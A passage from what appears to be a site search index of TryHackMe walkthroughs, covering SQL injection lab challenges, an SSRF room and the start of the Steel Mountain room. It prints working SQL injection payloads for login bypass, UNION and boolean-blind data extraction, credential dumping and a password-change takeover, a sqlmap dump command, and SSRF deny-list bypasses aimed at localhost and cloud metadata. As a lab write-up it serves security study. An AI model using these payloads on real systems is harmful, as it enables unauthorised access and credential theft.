<p></p> <p></p> <p>Retrieved Flag: <code>THM{645eab5d34f81981f5705de54e8a9c36}</code></p>"},{"location":"walkthroughs/thm/sqlinjectionlab/#sql-injection-4-post-injection","title":"SQL Injection 4: POST Injection","text":"<p>Similar to the previous challenge, this challenge implements client-side controls to limit the input characters to alpha-numeric thereby preventing direct injection in the login form fields using special characters. Furthermore, unlike the last challenge, this challenge uses the POST method when submitting credentials.</p> <p><pre><code>&lt;div class=\"login-form\"&gt;\n    &lt;form action=\"/sesqli4/login\" onsubmit=\"return validateform()\" name=\"inputForm\" method=\"POST\"&gt;\n        &lt;h2 class=\"text-center\"&gt;Log in&lt;/h2&gt;\n        &lt;div class=\"form-group\"&gt;\n            &lt;input type=\"text\" class=\"form-control\" placeholder=\"ProfileID\" required=\"required\" name=\"profileID\"&gt;\n        &lt;/div&gt;\n        &lt;div class=\"form-group\"&gt;\n            &lt;input type=\"password\" class=\"form-control\" placeholder=\"Password\" required=\"required\" name=\"password\"&gt;\n        &lt;/div&gt;\n        &lt;div class=\"form-group\"&gt;\n            &lt;button type=\"submit\" class=\"btn btn-primary btn-block\"&gt;Log in&lt;/button&gt;\n        &lt;/div&gt;\n    &lt;/form&gt;\n&lt;/div&gt;\n</code></pre> In this case, we cannot simply inject malicious strings into the login fields or manipulate the URL like in the previous challenge. Since, this challenge uses the POST method to make HTTP requests, we may be able to intercept the request using a proxy like BurpSuite.</p> <p>Open BurpSuite and ensure Intercept is enabled (don't forget to configure the browser to use the Burp proxy using FoxyProxy!)</p> <p></p> <p></p> <p></p> <p></p> <p>With the request intercepted, modify the profileID to include the malicious statement and forward the request to the server. Ensure to URL encode the modified statement before sending a request (CTRL + u).</p> <p></p> <p></p> <p>Looks like the payload execution was successful as we are able to bypass authentication check as well as the client-side filtering to log in as the first user data retrieved.</p> <p></p> <p></p> <p>The executed query on the back end is as follows.</p> <p><pre><code>SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = 'test' OR 1=1--' AND password = '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08'\n</code></pre> Retrieved Flag: <code>THM{727334fd0f0ea1b836a8d443f09dc8eb}</code></p>"},{"location":"walkthroughs/thm/sqlinjectionlab/#sql-injection-5-update-statement","title":"SQL Injection 5: UPDATE Statement","text":"<p>Log in using the provided credentials: <code>10:toor</code>.</p> <p>Let's look at the <code>Edit Profile</code> page and test if it is vulnerable to SQLi. We are presented with three input fields which can be updated. </p> <p></p> <p>It is a safe assumption that the application executes an UPDATE query based on the inputs by a user. The most likely form resembles the following.</p> <p><pre><code>UPDATE usertable SET column1='',column2='',column3='' WHERE &lt;Some Condition&gt;\n</code></pre> In order to test if the Edit Profile application is susceptible to SQLi, we need too figure out the column names. Let's have a look at the source-code for the webpage.</p> <p><pre><code>&lt;div class=\"login-form\"&gt;\n    &lt;form action=\"/sesqli5/profile\" method=\"post\"&gt;\n        &lt;h2 class=\"text-center\"&gt;Edit Francois's Profile Information&lt;/h2&gt;\n        &lt;div class=\"form-group\"&gt;\n            &lt;label for=\"nickName\"&gt;Nick Name:&lt;/label&gt;\n            &lt;input type=\"text\" class=\"form-control\" placeholder=\"Nick Name\" id=\"nickName\" name=\"nickName\" value=\"\"&gt;\n        &lt;/div&gt;\n        &lt;div class=\"form-group\"&gt;\n            &lt;label for=\"email\"&gt;E-mail:&lt;/label&gt;\n            &lt;input type=\"text\" class=\"form-control\" placeholder=\"E-mail\" id=\"email\" name=\"email\" value=\"\"&gt;\n        &lt;/div&gt;\n        &lt;div class=\"form-group\"&gt;\n            &lt;label for=\"password\"&gt;Password:&lt;/label&gt;\n            &lt;input type=\"password\" class=\"form-control\" placeholder=\"Password\" id=\"password\" name=\"password\"&gt;\n        &lt;/div&gt;\n        &lt;div class=\"form-group\"&gt;\n            &lt;button type=\"submit\" class=\"btn btn-primary btn-block\"&gt;Change&lt;/button&gt;\n        &lt;/div&gt;\n        &lt;div class=\"clearfix\"&gt;\n            &lt;label class=\"pull-left checkbox-inline\"&gt;&lt;/label&gt;\n        &lt;/div&gt;\n    &lt;/form&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n</code></pre> Based on the source-code above, we can reasonable assume that the potential column names are: <code>nickName</code>, <code>email</code> and <code>password</code>.</p> <p>With this knowledge, we can attempt to test for SQLi vulnerability in the update form. Keeping in mind the UPDATE syntax, let's try injecting the following injecting the following into the Nick Name field.</p> <p><pre><code>',nickName='test',email='email'--\n</code></pre> The resultant executed query resembles the following. Notice how the <code>--</code> converts everything following it to a comment which as a result is not executed.</p> <p><pre><code>UPDATE usertable SET nickName='',nickName='test',email='email'--',email='' WHERE UID='1'\n</code></pre> With both fields set to their respective values, this confirms both the column names being correct and that SQLi vulnerability exists. Note that we can verify that the E-mail field is also vulnerable in the same way.</p> <p></p> <p>Now that we know that the form is vulnerable to SQLi, we can begin enumerating the the database.</p> <p>First thing we need to identify is what kind of database is in use. We can obtain this information by asking the database to identify itself. As we don't know what kind of database the application is running, we will need to try several.</p> <p>The following is a list of version statements which can be used to determine database type.</p> <p><pre><code>MySQL and MSSQL: @@version\nOracle: SELECT banner FROM v$version\nSQLite: sqlite_version()\n</code></pre> Let's test for MySQL and MSSQL first.</p> <p><pre><code>',nickName=@@version--\n</code></pre> The fields did not change from their previous values which indicates that the database is not of type MySQL or MSSQL.</p> <p>Let's test for Oracle.</p> <p><pre><code>',nickName=(SELECT banner FROM v$version)--\n</code></pre> The fields did not change from their previous values which indicates that the database is not of type Oracle.</p> <p>Let's try for SQLite.</p> <p><pre><code>',nickName=sqlite_version()--\n</code></pre> We receive a version <code>3.22.0</code> back in the Nick Name field. This implies that we are working with an SQLite version 3.22.0 database.</p> <p></p> <p>Now that we know what database we are working with, we can continue with our enumeration. Let's extract all the tables.</p> <p><pre><code>',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%')--\n</code></pre> </p> <p></p> <p>Looks like we have two tables: <code>usertable</code> and <code>secrets</code>. Let's extract all the columns in the secrets table.</p> <p><pre><code>',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets')--\n</code></pre> </p> <p></p> <p>Let's retrieve the the contents of the secret column.</p> <p><pre><code>',nickName=(SELECT group_concat(secret) FROM secrets)--\n</code></pre> </p> <p></p> <p>Retrieve Flag: <code>THM{b3a540515dbd9847c29cffa1bef1edfb}</code></p>"},{"location":"walkthroughs/thm/sqlinjectionlab/#vulnerable-startup-broken-authentication","title":"Vulnerable Startup: Broken Authentication","text":"<p>We can bypass authentication using the techniques we learnt in the previous challenges. This login form appears to use the POST method for making HTTP requests however no client-side filtering of special characters is in place. We can go ahead and try to inject <code>1' OR 1=1--</code> to see if we can bypass authentication.</p> <p></p> <p>Retrieved Flag: <code>THM{f35f47dcd9d596f0d3860d14cd4c68ec}</code></p>"},{"location":"walkthroughs/thm/sqlinjectionlab/#vulnerable-startup-broken-authentication-2","title":"Vulnerable Startup: Broken Authentication 2","text":"<p>This challenge builds upon the previous challenge. Our goal here is to find a way to dump all the passwords in the database to retrieve the flag without using blind injection.</p> <p>Let's attempt authentication bypass using <code>1' OR 1=1--</code>. Note that the login form is not enforcing any client-side special character filter.</p> <p></p> <p>Looks like we are logged in as the <code>admin</code> user. Before we can proceed with dumping the passwords, we need to identify locations where the results from the login query are returned within the application.</p> <p>A possible location to display retrieved data might be the the <code>Logged in as ...</code> field in the application. This field appears to show the username once the user is successfully logged in.</p> <p></p> <p>Let's see if we can display some retrieved data in this field. First thing we need to do is to enumerate the number of columns. The authentication form is most likely crafting a query in the background which looks something like this:</p> <p><pre><code>SELECT username FROM users WHERE username = '%username%' AND password = '%password%'\n</code></pre> We can try enumerating the number of columns using a UNION based attack. Since we don't know the column names, we can use column numbers instead in our enumeration attempts.</p> <p><pre><code>' UNION SELECT 1--\n</code></pre> If the number of columns are incorrect, the application will throw an <code>Invalid username or password</code> error message as the WHERE condition in the SQL query will return a FALSE. A correct number of columns should bypass authentication.</p> <p><pre><code>' UNION SELECT 1,2--\n</code></pre> </p> <p></p> <p>Looks like the table has two columns. Notice that the username in the <code>Logged in as</code> field is replaced by the integer 2 from our UNION SELECT statement. We can leverage this to begin enumerating the database.</p> <p>Let's begin by figuring out the database type. Similar to one of the challenges above, we can enumerate different database version commands to determine what type of database we are working with.</p> <p><pre><code>MySQL and MSSQL: @@version\nOracle: SELECT banner FROM v$version\nSQLite: sqlite_version()\n</code></pre> Let's start with SQLite first as this type of database was used in previous challenges. Inject the following SQL command in the Username field on the login form.</p> <p><pre><code>' UNION SELECT 1,sqlite_version()--\n</code></pre> </p> <p></p> <p>We have successful enumeration of the database version number. This confirms that we are working with SQLite Database Version 3.22.0. With this knowledge, we can begin enumerating the rest of the database schema. Lets continue by retrieving all the table names.</p> <p><pre><code>' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'--\n</code></pre> </p> <p></p> <p>It looks like we only have one table named <code>users</code>. Let's enumerate all the columns in the <code>users</code> table.</p> <p><pre><code>' UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--\n</code></pre> </p> <p></p> <p>We have successful enumeration of all the columns in the <code>users</code> table: <code>username</code>, <code>password</code>. With this knowledge, we can dump the contents of the columns.</p> <p><pre><code>' UNION SELECT 1,group_concat(username || \":\" || password) FROM users--\n</code></pre> </p> <p></p> <p>We have successfully dumped the contents of the <code>users</code> table.</p> <p>Retrieved Flag: <code>THM{fb381dfee71ef9c31b93625ad540c9fa}</code></p>"},{"location":"walkthroughs/thm/sqlinjectionlab/#vulnerable-startup-broken-authentication-3-blind-injection","title":"Vulnerable Startup: Broken Authentication 3 (Blind Injection)","text":"<p>In this challenge, we are unable to leverage the username display in the application to extract data from the database. Although the login form has the same vulnerability, we will need to utilize blind SQL injection techniques to retrieve the data.</p> <p>Content-based (also known as Boolean-based) blind SQL injections rely on the attacker monitoring the response of the web applications. The premise behind content-based blind SQLi is to inject SQL queries which prompt a TRUE or FALSE response for character of the data we are interested in. By discerning differences between a response for an injected query which produces a TRUE result against a response for an injected query which produces a FALSE result, the attacker is able to retrieve data piecewise.</p> <p>The aim is to extract the password for the user <code>admin</code> from the <code>users</code> table. We are provided with the respective column names of <code>username</code> and <code>password</code> which we can leverage without the need to enumerate them. The database type is SQLite.</p> <p>Before we begin, we need to confirm whether the application is vulnerable to content-based blind SQL injection and evaluate the application's response to TRUE and FALSE queries.</p> <p>Let's begin by injecting a query which always returns a FALSE.</p> <p><pre><code>admin' AND 1=2--\n</code></pre> </p> <p></p> <p>With the FALSE query, the default response of the web application is to fail authentication and display a message stating <code>Invalid username or password</code>.</p> <p>Let's inject an always TRUE query.</p> <p><pre><code>admin' AND 1=1--\n</code></pre> </p> <p></p> <p>With the TRUE query, the default response of the web application is to bypass authentication and log us in.</p> <p>Now that we know the default behaviour, let's enumerate the length of the <code>admin</code> user's password. We can test the lower bound of the password with the following statement.</p> <p><pre><code>admin' AND LENGTH((SELECT password FROM users WHERE username = 'admin')) &gt; 1--\n</code></pre> We get a successful login which means that the length of the password is greater than one. Now let's test the upper limit of the password.</p> <p><pre><code>admin' AND LENGTH((SELECT password FROM users WHERE username = 'admin')) &gt; 50--\n</code></pre> We can know now that the range of the password is somewhere between 1 and 50. We can use BurpSuite's Intruder to iterate through to find the exact length of the password.</p> <p>Open BurpSuite and and turn on Intercept (ensure that the browser is proxying through BurpSuite).</p> <p></p> <p>Send the intercepted request to Intruder and Clear all payload markers. Highlight the new payload marker (in our case it is the integer length of the password) and click Add to insert the new payload marker.</p> <p></p> <p>Select the Payloads tab on the top and under Payload Sets select Payload Types --&gt; Numbers. Configure the range to be from 1 to 50 with an increment of 1. Press Start Attack to begin the iterative attack.</p> <p></p> <p>BurpSuite Intruder can take some time in the Community Edition so we will need to be patient. Once the attack is complete, we can look at the results. We expect an HTTP 302 redirect when the right length of the password is guessed.</p> <p></p> <p>We have successfully enumerated the password length (37) of the <code>admin</code> user. To verify, we can test the length with the query above to see if we get successful login which we do.</p> <p>With this knowledge, we can start retrieving the passwords in a piecewise manner. In order to do this, we will leverage SQLite's substr function.</p> <p><pre><code>SUBSTR(string, &lt;start&gt;, &lt;length&gt;)\n</code></pre> Our injected query will resemble something like the following.</p> <p><pre><code>admin' AND SUBSTR((SELECT password FROM users WHERE username = 'admin'),1,1) = 'X'\n</code></pre> Note that we are told in the challenge that the application converts the user input to lowercase which complicates our approach as <code>X</code> is not the same as <code>x</code> when comparing password strings. We can circumvent this by injecting our characters as hex representation via the substitution type X and then using SQLite's CAST expression to convert the value to the datatype the database expects. Our injected query would look something like the following.</p> <p><pre><code>admin' AND SUBSTR((SELECT password FROM users WHERE username = 'admin'),1,1) = CAST(X'54' as Text)--\n</code></pre> Where <code>54</code> is hex representation of ASCII T (0x54). We can iterate through the different permutations manually (which is very time consuming) or using BurpSuite Intruder (which also can take a significant amount of time when using the Community Edition).</p> <p>Instead of manual enumeration or using BurpSuite, we can also use a tool called sqlmap which automates the process of detecting and exploiting SQL injection flaws. We can use the following command to exploit the SQLi vulnerability in the username field and dump all the passwords related to this challenge.</p> <p><pre><code>$ sqlmap -u http://10.10.202.208:5000/challenge3/login --data=\"username=admin&amp;password=admin\" --level=5 --risk=3 --dbms=sqlite --technique=b --threads=10 --dump\n</code></pre> </p> <p></p> <p>Retrieved Flag: <code>THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}</code></p>"},{"location":"walkthroughs/thm/sqlinjectionlab/#vulnerable-startup-vulnerable-notes","title":"Vulnerable Startup: Vulnerable Notes","text":"<p>In this challenge, the previous vulnerability related to the login function has been fixed. A new note function has been added which allows a user to add notes on their page.</p> <p>Let's begin by exploring the new note functionality added by the developers. Since the login form is not longer vulnerable to SQLi, we will need to create a dummy account to permit recon. It looks like the login form is using parameterized queries to prevent inputs from leading to SQL injection.</p> <p></p> <p>We can test to see the input fields in the Notes form are vulnerable to SQLi.</p> <p></p> <p>The input fields don't appear to be vulnerable (form is most likely using parameterized queries as well) however input sanitization does not appear to be implemented. This means that the server will accept malicious data and place it in the database since the application does not sanitize it.</p> <p>Based on this knowledge, we can infer that parameterized queries are implemented for all input fields but input sanitization is not implemented globally. Let's see what happens if we create an account with a malicious username.</p> <p><pre><code>' UNION SELECT 1,2--\n</code></pre> Creating and logging in with the username above indicates that while parameterized queries may be used in all input fields, the function which retrieves the notes for a particular user does not appear to use parameterized queries. Our malicious username appears to be directly concatenated into the SQL query making it the function vulnerable to SQL injection.</p> <p></p> <p>The first column holds data from the <code>Title</code> field while the second column holds data from the <code>Note</code> field. On a side note, a username with incorrect column numbers displays no notes. With this knowledge, we can start enumerating the database. As the table is based on the same challenge as the last one, it is safe to assume that we are dealing with SQLite.</p> <p>Let's begin by enumerating the tables in the database by creating the following username.</p> <p><pre><code>' UNION SELECT 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%'--\n</code></pre> </p> <p></p> <p>Let's enumerate columns from the <code>users</code> table by creating the following username.</p> <p><pre><code>' UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--\n</code></pre> </p> <p></p> <p>Now that we know the columns, we can go ahead and extract the usernames and passwords from the table by creating the following username.</p> <p><pre><code>' UNION SELECT 1,group_concat(username || \":\" || password) FROM users--\n</code></pre> </p> <p></p> <p>Retrieved Flag: <code>THM{4644c7e157fd5498e7e4026c89650814}</code></p> <p>Note that we can also solve this challenge using sqlimap and a tamper script. For more information refer to SQL Injection Lab room on THM.</p>"},{"location":"walkthroughs/thm/sqlinjectionlab/#vulnerable-startup-change-password","title":"Vulnerable Startup: Change Password","text":"<p>For this challenge, the vulnerability on the Notes form has been fixed. The devs have implemented new functionality to allow a user to change their password by navigating to the Profile page. The goal of this challenge is to log into the <code>admin</code> account in order to retrieve the flag.</p> <p>It is not uncommon for password change functionality to be implement using UPDATE SQL statements. Typically, a developer would ensure that parameterized queries are used for all input fields such as username and passwords along with input sanitization.</p> <p>A poorly implemented SQL query for a password change functionality would look something like the following.</p> <p><pre><code>SELECT username, password FROM users WHERE id =?;\nUPDATE users SET password = ? WHERE username = '\" + username +\"';\n</code></pre> In the above queries, both the  id and password field uses parameterized query. The second query, however, directly concatenates the username to the statement. The assumption some developers make is that since the username does not come directly from an input in the password change form but is rather fetched from the database based on the user id stored in the session object, additional precautions do not need to be taken. An attacker can leverage this oversight by crafting malicious usernames which allows changing the password of a different user (ie. admin).</p> <p>Let's begin by creating a malicious username in hopes that the username is directly concatenated into a query similar to the example above.</p> <p><pre><code>admin'--\n</code></pre> </p> <p></p> <p>We can see from the above image that input sanitation is not implemented. Let's see if the developer implemented unsafe functionality as described above. With our malicious username, the above SQL queries would result in the following.</p> <p><pre><code>SELECT username, password FROM users WHERE id =?;\nUPDATE users SET password = ? WHERE username = 'admin'--';\n</code></pre> Note how the executed query would result in a password change for the <code>admin</code> user rather than our malicious <code>admin'--</code> user. Let's see if this works in practice.</p> <p>Go to the Profile page and change the password to <code>testpass</code> for our malicious username.</p> <p></p> <p>Let's see if our assumption is correct and try logging in using the following credentials: <code>admin:testpass</code>.</p> <p></p> <p>Looks like we were successful in changing the administrator user's password.</p> <p>Retrieved Flag: <code>THM{cd5c4f197d708fda06979f13d8081013}</code></p>"},{"location":"walkthroughs/thm/sqlinjectionlab/#vulnerable-startup-book-title","title":"Vulnerable Startup: Book Title","text":"<p>In this challenge, we will be looking at a vulnerable search functionality added to the web application. Based on the information provided by the developer, the application concatenates the user input directly into the SQL statement. The gaol of this challenge is to abuse this vulnerability and find the hidden flag.</p> <p>Let's begin by creating a temporary account and log in so that we can test the functionality. It looks like the web application makes a GET request everything a search for a book title is made and displays the results in the web application.</p> <p></p> <p></p> <p>Based on developer's notes, the backend makes the following query when a search is made.</p> <p><pre><code>SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '\" + title + \"%')\n</code></pre> The above query is vulnerable to SQLi as any input into the search field is concatenated directly into the query. Let's inject the following input and see what happens.</p> <p><pre><code>') OR 1=1--\n</code></pre> The above statement converts the search statement into the following always TRUE statement.</p> <p><pre><code>SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '') OR 1=1--'')\n</code></pre> </p> <p></p> <p>Looks like we get a full dump of the book titles in the database. With this knowledge, we can attempy UNION based attacks and attempt to enumerate and extract the credentials. As with previous challenges, the database is built upon SQLite so we will proceed with this in mind.</p> <p>Let's begin by first enumerating the number of columns in the table. Just by looking at the full dump of the book titles, we can infer the number of columns. There are columns reserved for the title of the book, description, author and some sort of an integer id identifier. So let's test to see if 4 columns is the correct number. </p> <p><pre><code>') UNION SELECT 1,2,3,4--\n</code></pre> </p> <p></p> <p>Looks like our inference was correct and the table in question has 4 columns. Let's proceed with enumerating the tables in the database.</p> <p><pre><code>') UNION SELECT 1,2,3,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%'--\n</code></pre> </p> <p></p> <p>The table we are interested in the <code>users</code> table. Enumerate the columns from the table.</p> <p><pre><code>') UNION SELECT 1,2,3,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--\n</code></pre> </p> <p></p> <p>Let's extract the credentials.</p> <p><pre><code>') UNION SELECT 1,2,3,group_concat(username || \":\" || password) FROM users--\n</code></pre> </p> <p></p> <p>Retrieved Flag: <code>THM{27f8f7ce3c05ca8d6553bc5948a89210}</code></p>"},{"location":"walkthroughs/thm/sqlinjectionlab/#vulnerable-startup-book-title-2","title":"Vulnerable Startup: Book Title 2","text":"<p>In this challenge, the web application uses the results of one query in to an other without properly sanitizing the data. Both queries are vulnerable as the first query can be exploited through blind SQL injection. However, since the second query is also vulnerable, we can simplify the exploitation and use UNION based injection instead of Boolean-based blind injection. The goal of this task is to exploit the vulnerability without using blind SQL injection and retrieve the credentials.</p> <p>Based on developer's notes provided, the backend queries excluded look like the following.</p> <p><pre><code>bid = db.sql_query(f\"SELECT id FROM books WHERE title like '{title}%'\", one=True)\nif bid:\n    query = f\"SELECT * FROM books WHERE id = '{bid['id']}'\"\n</code></pre> Here, the first query retrieves the ID of the book while second query retrieves the data associated with the ID from the first query. We can exploit this crafting a malicious input for the first query which will then be executed by the second.</p> <p>By injecting:</p> <p><pre><code>' UNION SELECT 'test\n</code></pre> We should get a resultant executed query of:</p> <p><pre><code>SELECT id FROM books WHERE title like 'test%';\nSELECT * FROM books WHERE id = 'test%';\n</code></pre> If we are able to guess an ID which exists in the database, we may be able confirm UNION based injection. Let's try an ID of 1.</p> <p><pre><code>' UNION SELECT '1'--\n</code></pre> This should give a resultant executed query of:</p> <p><pre><code>SELECT id FROM books WHERE title like '' UNION SELECT '1'--%';\nSELECT * FROM books WHERE id = '1';\n</code></pre> </p> <p></p> <p>Looks like we have success with our guess. Since we know that our malicious input from the first query is being passed unsanitized to the second query, we can begin enumerating the database. First step is to figure out the number of columns in the current table.</p> <p>In order to confirm the number of columns in the database, we need the second query to execute the following query.</p> <p><pre><code>SELECT * FROM books WHERE id = '' UNION SELECT 1,2,...\n</code></pre> We will need to work backwards. Say we inject the following:</p> <p><pre><code>' UNION SELECT '1' UNION SELECT 1,2,3,4--\n</code></pre> The resultant executed queries would look like the following.</p> <p><pre><code>SELECT id FROM books WHERE title like '' UNION SELECT '1' UNION SELECT 1,2,3,4--%';\nSELECT * FROM books WHERE id = '1 UNION SELECT 1,2,3,4--%';\n</code></pre> This breaks the query and thus nothing get's executed. This happens because  our original injected input closes the string that is supposed to be returned by appending the single quote before the second UNION clause. In order to fix this syntax issue, we will need to escape the single quote.</p> <p><pre><code>' UNION SELECT '1'' UNION SELECT 1,2,3,4--\n</code></pre> Escaping the appended single quote before the second UNION statement should result in the following executed query.</p> <p><pre><code>SELECT id FROM books WHERE title like '' UNION SELECT '1'' UNION SELECT 1,2,3,4--%';\nSELECT * FROM books WHERE id = '1' UNION SELECT 1,2,3,4--%';\n</code></pre> </p> <p></p> <p>Looks like we have success. Let's go ahead and modify our payload so it returns an invalid record to make things clearer.</p> <p><pre><code>' UNION SELECT '-1'' UNION SELECT 1,2,3,4--\n</code></pre> </p> <p></p> <p>Like the previous challenge, the credentials are stored in the <code>users</code> table under the columns <code>username</code> and <code>password</code>. Let's go ahead and extract them and finish the challenge.</p> <p><pre><code>' UNION SELECT '-1'' UNION SELECT 1,2,3,group_concat(username || \":\" || password) from users--\n</code></pre> </p> <p></p> <p>Retrieved Flag: <code>THM{183526c1843c09809695a9979a672f09}</code></p>"},{"location":"walkthroughs/thm/ssrf/","title":"SSRF","text":""},{"location":"walkthroughs/thm/ssrf/#task-1-what-is-an-ssrf","title":"Task 1- What is an SSRF?","text":"<p>Server-Side Request Forgery (SSRF) is a vulnerability that allows malicious users to cause a web server to make an additional or edited HTTP request to a resource of attacker's choosing. There are two types of SSRF vulnerabilities: 1. Regular SSRF where data is returned to the attacker's screen. 2. Blind SSRF where SSRF occurs but no information is returned to the attacker's screen.</p> <p>A successful SSRF attack can result in access to unauthorized areas, access to organizational data, ability to scale the internal network, and reveal authentication tokens/credentials amongst other things.</p>"},{"location":"walkthroughs/thm/ssrf/#task-2-ssrf-examples","title":"Task 2 - SSRF Examples","text":"<p>In this task, we look at a simple example of an SSRF vulnerability. The example below shows how an attacker can have complete control over the page requested by the web server. The expected request is what the web server is expecting to receive, with the section in the red being the URL that the website will fetch for the information. The attacker can modify the area in red to a URL of their choosing.</p> <p></p> <p>The below example shows how an attacker can reach a the <code>/api/user</code> page with only having control over the path by using directory traversal. </p> <p></p> <p>The example below shows how an attacker can control the server's subdomain to which the request is made. Note that the payload ending in <code>&amp;x=</code> is used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (<code>?x=</code>) on the query string.</p> <p></p> <p>The example below shows how an attacker can force a web server to request a server of the attacker's choice. By doing so, we can capture request headers that are sent to the attacker's specific domain. These headers can contain authentication credentials or API keys sent by the targeted server.</p> <p></p>"},{"location":"walkthroughs/thm/ssrf/#task-3-finding-an-ssrf","title":"Task 3 - Finding an SSRF","text":"<p>Potential SSRF vulnerabilities can be spotted in a web application in many different ways. The following are four common places to look: - When a full URL is used in a parameter in the address bar:  - A hidden filed in a form:  - A partial URL such as just the hostname:  - Only the path of the URL: </p> <p>When working with blind SSRF where no output is reflected back to you, you will need to use an external HTTP logging tool to monitor requests such as <code>requestbin.com</code>, your own HTTP server, or BurpSuite's Collaborator client.</p>"},{"location":"walkthroughs/thm/ssrf/#defeating-common-ssrf-defenses","title":"Defeating Common SSRF Defenses","text":"<p>Developers may implement checks in their applications to make sure the requested resource meets specific rules in order to mitigate risks of SSRF vulnerabilities. There are two common approaches to this: Deny Lists and Allow Lists. Let's look at these a bit further.</p>"},{"location":"walkthroughs/thm/ssrf/#deny-list","title":"Deny List","text":"<p>A Deny List is where all requests are accepted apart from resources specified in a list or matching a particular pattern. A web application may employ a deny list to protect sensitive endpoints, IP address or domains from being accessed by the public while still allowing access to other locations. A specific endpoint to restrict access is the localhost which may contain server performance data or further sensitive information. As a result domain names such as localhost or 127.0.0.1 typically appear on a deny list.</p> <p>Attackers can bypass a Deny List by using alternative localhost references such as <code>0</code>, <code>0.0.0.0</code>, <code>0000</code>, <code>127.1</code>, <code>127.*.*.*</code>, <code>2130706433</code>, <code>017700000001</code> or subdomains that have a DNS record which resolves to the IP address <code>127.0.0.0</code> such as 127.0.01.nip.io.</p> <p>In a cloud environment, it would be beneficial to further block access to the IP address 169.254.169.254 which contains metadata for the deployed cloud server. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP address 169.254.169.254.</p>"},{"location":"walkthroughs/thm/ssrf/#allow-list","title":"Allow List","text":"<p>An allow list is where all requests get denied unless they appear on a list or match a particular pattern. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain which matches the desired pattern. The application's logic would then allow this input and let an attacker control the internal HTTP request.</p>"},{"location":"walkthroughs/thm/ssrf/#open-redirect","title":"Open Redirect","text":"<p>If the above bypasses do not work, an attacker could employ the open redirect technique. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address.</p> <p>Take for example the link <code>https://website.thm/link?url=https://tryhackme.com</code>. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. In a scenario where there is a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/, an attacker could utilize the above feature to redirect the internal HTTP request to a domain of the attacker's choice.</p>"},{"location":"walkthroughs/thm/ssrf/#task-5-ssrf-practical","title":"Task 5 - SSRF Practical","text":"<p>In this challenge task, we will be putting what we have learned so far to the test.</p> <p>The challenge description tells us that we have come across two new endpoints during a content discovery exercise against the Acme IT Support website. The first one is <code>/private</code>, which gives us an error message explaining that the contents cannot be viewed from our IP address. The second is a new version of the customer account page at <code>/customers/new-account-page</code> with a new feature allowing customers to choose an avatar for their account.</p> <p>Let's begin by creating a new customer account and sign in.</p> <p></p> <p>Once signed in, let's visit the second endpoint at <code>/customers/new-account-page</code>. Looking at the page source, we see that the avatar form field value contains the path to the image. The background-image style confirms this in the DIV element.</p> <p></p> <p>Selecting one of the avatars and then clicking Update Avatar button will display the currently selected avatar. Viewing the page source reveals that the current avatar is displayed using the data URI scheme. The image content is base64 encoded.</p> <p></p> <p></p> <p>Now let's try making the request again by changing the avatar value to <code>private</code> in hopes that the server will access the resource and get past the IP address block. To do this, we will use the developer tools bundled with the browser. Use the Inspect tool to highlight the code for one of the avatars and change the value to <code>private</code>.</p> <p></p> <p>Clicking on the Update Avatar button however reveals that the web application has a deny list in place and has blocked access to the <code>/private</code> endpoint.</p> <p></p> <p>Since the path cannot start with <code>/private</code> we can use the directory traversal trick to reach our desired endpoint. This can be accomplished by setting the avatar value to <code>x/../private</code> and then selecting the said avatar and clicking Update Avatar. This trick works because when the web server receives the request for <code>x/../private</code>, it knows that the <code>../</code> string means to move up a directory that now translates the request to just <code>/private</code>.</p> <p></p> <p>Viewing the page source from the avatar form, we find that the currently set avatar now contains the contents from the <code>/private</code> directory in base64 encoding. Decoding this content reveals the flag.</p> <p></p> <p></p>"},{"location":"walkthroughs/thm/steelmountain/","title":"Steel Mountain","text":""},{"location":"walkthroughs/thm/steelmountain/#introduction","title":"Introduction","text":"<p>In this room, we will be enumerating a Windows machine, gain access with Metasploit, and escalate privileges to Administrator.</p> <p>Note: The target machine does not respond to ping (ICMP).</p>"},{"location":"walkthroughs/thm/steelmountain/#reconosint","title":"Recon/OSINT","text":"<p>Target IP: 10.10.173.90 (<code>$IP</code>)</p> <p>The target machine is running a Windows OS.</p> <p>There is a simple webpage available on port 80.</p>"},{"location":"walkthroughs/thm/steelmountain/#enumeration","title":"Enumeration","text":"<p>Let's start by enumerating the machine using an Nmap scan.</p> <p><pre><code>sudo nmap -sC -SV -oN nmap_initial.output $IP \n</code></pre> </p> <p>There is a Rejetto Http File Server version 2.3 running on port 8080.</p> <p></p> <p>Let's exploit this service using Metasploit.</p>"},{"location":"walkthroughs/thm/steelmountain/#exploitation","title":"Exploitation","text":"<p>Start Metasploit console using the command <code>msfconsole</code> and search for exploits related to the file server in question.</p> <p></p> <p>Let's look at the information associated with the exploit.</p> <p></p> <p>Let's set the LHOST, RHOSTS, and RPORT to their respective values for the attack machine.</p> <p></p> <p>With the appropriate options set, we can run the exploit and get our initial foothold on the target machine.</p> <p></p> <p>The user flag can be found at <code>C:\\Users\\bill\\Desktop\\user.txt</code>.</p> <p></p>"},{"location":"walkthroughs/thm/steelmountain/#privilege-escalation","title":"Privilege Escalation","text":"<p>Now that we have a foothold on the target machine, we can start looking at ways to privilege escalate. Let's begin by further enumerating the machine.</p> 